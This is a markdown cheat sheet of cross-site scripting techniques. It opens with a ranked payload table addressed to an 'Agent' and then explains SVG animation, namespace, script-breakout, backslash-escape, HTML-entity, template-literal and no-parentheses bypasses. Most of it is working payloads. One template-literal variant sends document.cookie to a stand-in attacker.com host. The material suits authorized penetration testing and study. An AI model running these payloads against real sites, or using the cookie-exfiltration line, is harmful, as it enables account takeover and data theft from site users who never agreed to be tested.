# XSS, SVG, Namespaces & JS Context — Deep Notes

---

## ⚡ Quick Reference (Agent: read this section first)

### Injection contexts and payloads — try in this order

| # | Context | Payload |
|---|---------|--------|
| 1 | HTML body (no filter) | `<img src=x onerror=alert(1)>` |
| 2 | HTML body | `<svg onload=alert(1)>` |
| 3 | HTML body | `<details open ontoggle=alert(1)>` |
| 4 | Inside `<script>` block | `</script><img src=x onerror=alert(1)>` |
| 5 | JS string — single quote | `';alert(1)//` |
| 6 | JS string — double quote | `";alert(1)//` |
| 7 | JS string — backslash escaped | `\';alert(1)//` |
| 8 | Inside attribute (break out) | `" onmouseover="alert(1)` |
| 9 | Inside attribute (single) | `' onmouseover='alert(1)` |
| 10 | URL/href attribute | `javascript:alert(1)` |
| 11 | SVG animation | `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x=20 y=20>click</text></a></svg>` |
| 12 | Namespace bypass | `<a xlink:href="javascript:alert(1)">click</a>` |
| 13 | No parentheses allowed | `onerror=alert;throw 1` — see `bypass-no-parentheses.md` for full ladder |
| 14 | Attribute only (no new tags) | `accesskey="x" onclick="alert(1)"` (trigger: ALT+SHIFT+X) |
| 15 | Custom/unknown tag | `<xss onclick=alert(1)>click</xss>` |
| 16 | Attribute JS context, quotes filtered | `&apos;-alert(1)-&apos;` — HTML entity decoded by browser before JS runs |
| 17 | Template literal context (backticks) | `${alert(1)}` — no string break needed; `${}` is a live expression slot |

### Decision: when to stop
- Payload executes → **report hit**; record context + parameter + payload.
- All 17 rows fail → escalate to `dom-xss.md`.
- `()` filtered → read `bypass-no-parentheses.md` for full escalation ladder.

---

## 1. SVG Basics

* SVG = Scalable Vector Graphics (XML-based)
* Part of DOM → scriptable, stylable, interactive
* Uses its own namespace: `http://www.w3.org/2000/svg`

### Example

```html
<svg width="200" height="200">
  <circle cx="100" cy="100" r="50" fill="red" />
</svg>
```

---

## 2. Namespaces

### Definition

Namespace = identifier that tells browser how to interpret a tag.

### Why needed

Same tag name can mean different things:

```html
<title>   <!-- HTML vs SVG meaning differs -->
```

### Example

```html
<svg xmlns="http://www.w3.org/2000/svg">
```

### Security Insight

* Filters often ignore namespace differences
* Example bypass:

```html
<a xlink:href="javascript:alert(1)">
```

---

## 3. DOM Mutation

### Meaning

Mutation = changing DOM after initial parsing

### Example (JS)

```js
element.setAttribute("href", "evil")
```

### Example (SVG)

```html
<animate attributeName="href" values="javascript:alert(1)">
```

### Key Insight

* Initial state safe
* Runtime state dangerous

---

## 4. Mutable vs Immutable (Python)

### Immutable

```python
s = "hello"
s = s + "!"   # new object created
```

### Mutable

```python
arr = [1,2]
arr[0] = 99   # same object modified
```

### Key Insight

Variables = references, not objects

---

## 5. javascript: Pseudo-Protocol

### Works in URL-based attributes:

* `<a href>`
* `<iframe src>`
* `<form action>`
* `<area href>`
* SVG `<a href>`

### Example

```html
<a href="javascript:alert(1)">
```

### Rule

If attribute accepts URL → test `javascript:`

---

## 6. HTML Parsing vs JS Execution

### Flow

1. HTML parser builds DOM
2. On `<script>` → pause parsing
3. JS executes
4. Resume parsing

### Important

JS does NOT parse HTML

---

## 7. Breaking out of `<script>`

### Context

```html
<script>
var input = 'USER_INPUT';
</script>
```

### Payload

```html
</script><img src=1 onerror=alert(1)>
```

### Why it works

* HTML parser sees `</script>`
* exits script context
* parses new HTML

---

## 8. JS String Injection

### Example

```js
var input = 'USER_INPUT';
```

### Payloads

#### Expression-based

```js
'-alert(1)-'
```

#### Statement-based

```js
';alert(1)//
```

### Key Insight

Final JS must remain valid

---

## 9. Escaping Bypass (Backslash Trick)

### App does:

```js
' → \'
```

### Attack:

```js
\';alert(1)//
```

### Result:

```js
\\';alert(1)//
```

### Effect

* `\\` → literal `\`
* `'` becomes active → breaks string

---

## 10. throw + onerror Trick

### Payload

```js
onerror=alert;throw 1
```

### Flow

1. Assign handler
2. Throw exception
3. Browser calls handler
4. `alert(1)` executes

### Use Case

* No parentheses allowed
* Function calls restricted

---

## 11. Attribute Injection + accesskey

### Scenario

Cannot inject new tags, only attributes

### Payload

```html
<link rel="canonical" accesskey="x" onclick="alert(1)">
```

### Trigger

Keyboard shortcut (e.g., ALT+SHIFT+X)

---

## 12. Custom Tags

### Unknown tags

```html
<xss>Hello</xss>
```

* No behavior
* Treated as generic element

### With event

```html
<xss onclick="alert(1)">
```

→ Works due to attribute, not tag

---

## 13. Finding Custom Elements

### DevTools

```js
[...document.querySelectorAll("*")]
```

### Filter

```js
tag.includes("-")
```

### Registry

```js
customElements.get("tag-name")
```

---

## 14. SVG Animation XSS Payload

### Payload

```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```

---

## 15. How it Works

### Step-by-step

1. SVG parsed
2. `<animate>` targets parent (`<a>`)
3. Sets:

```html
href = javascript:alert(1)
```

4. User clicks → executes

---

## 16. Important SVG Rules

### Default targeting

```html
<animate> → parent element
```

### Explicit targeting

```html
<animate xlink:href="#id">
```

---

## 17. Key Attack Surfaces

* URL attributes
* Event handlers
* SVG animations
* Namespace confusion
* JS parsing context
* DOM mutation

---

## 18. HTML Encoding in Attribute JavaScript Context

### Context

User input lands inside a JavaScript string that is itself inside an HTML attribute:

```html
<a onclick="var x='USER_INPUT'">
```

### Why HTML encoding bypasses quote filters

Blocked: `'  "  (  )`

HTML entities are **not decoded by the server**. The browser decodes them during HTML parsing, **before** JavaScript executes. So a filtered `'` can be delivered as `&apos;` or `&#39;`.

### Exploit flow

1. Inject: `&apos;-alert(document.domain)-&apos;`
2. Server response (raw): `onclick="var x='&apos;-alert(1)-&apos;'"` 
3. Browser decodes: `var x='' - alert(1) - '';`
4. JS executes: `alert(1)` fires as a side-effect of the arithmetic expression

### Payloads

```html
&apos;-alert(1)-&apos;
```

```html
&#39;-alert(1)-&#39;
```

```html
onclick="alert&#40;1&#41;"
```

### Entity encoding reference

| Char | Named | Decimal |
|------|-------|---------|
| `'`  | `&apos;` | `&#39;` |
| `"`  | `&quot;` | `&#34;` |
| `(`  | — | `&#40;` |
| `)`  | — | `&#41;` |
| `<`  | `&lt;` | `&#60;` |
| `>`  | `&gt;` | `&#62;` |

### Context behavior — what works where

| Context | Entities decoded | Code executes |
|---------|-----------------|---------------|
| HTML text node | yes | no |
| Attribute value (JS) | yes | yes |
| Tag structure `< >` | no | no |

### Key rule

If input → HTML attribute → JavaScript:  HTML entity encoding = filter bypass primitive.

`&lt;img onerror=...&gt;` injected as raw text does **not** create an element — entities in tag position are not decoded into structure.

---

## 19. Template Literals — Expression Injection

### Context

User input lands inside a backtick template literal:

```html
<script>
var input = `USER_INPUT`;
</script>
```

### Core mechanism

`${...}` inside a template literal is a **live JS expression slot** — the engine evaluates whatever is inside it. No string break is needed.

### Exploit

```js
${alert(document.domain)}
```

Result in page:

```js
var input = `${alert(document.domain)}`;
```

→ `alert()` fires; return value (`undefined`) becomes the string content.

### Payload variants

```js
${alert(1)}
${confirm(1)}
${console.log(document.cookie)}
${alert(1),alert(2)}          // comma chains multiple calls
${fetch('//attacker.com/'+document.cookie)}
```

### If `alert` is blocked

```js
${confirm(1)}
${window['ale'+'rt'](1)}
${eval('ale'+'rt(1)')}
```

### Constraints

- Works **only** inside backticks
- `${}` has **no effect** inside `'...'` or `"..."` strings
- Do NOT use string-break tricks (`';alert(1);//`) here — they are unnecessary

### Mental model

Normal string injection: break syntax → inject statements 
Template literal injection: no break needed → inject directly into expression slot

---

## 20. No Parentheses — onerror + throw (Reference)

Full payload ladder is in `bypass-no-parentheses.md`.

### Quick payloads

| Constraint | Payload |
|------------|---------|
| Baseline | `onerror=alert;throw 1337` |
| No `;` | `{onerror=alert}throw 1337` |
| No `;` or quotes | `throw onerror=alert,1337` |
| Need arbitrary exec | `onerror=eval;throw '=alert(1)'` |
| Firefox | `{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}` |
| No `throw` | `TypeError.prototype.name='=/',0[onerror=eval]['/-alert(1)//']` |

---
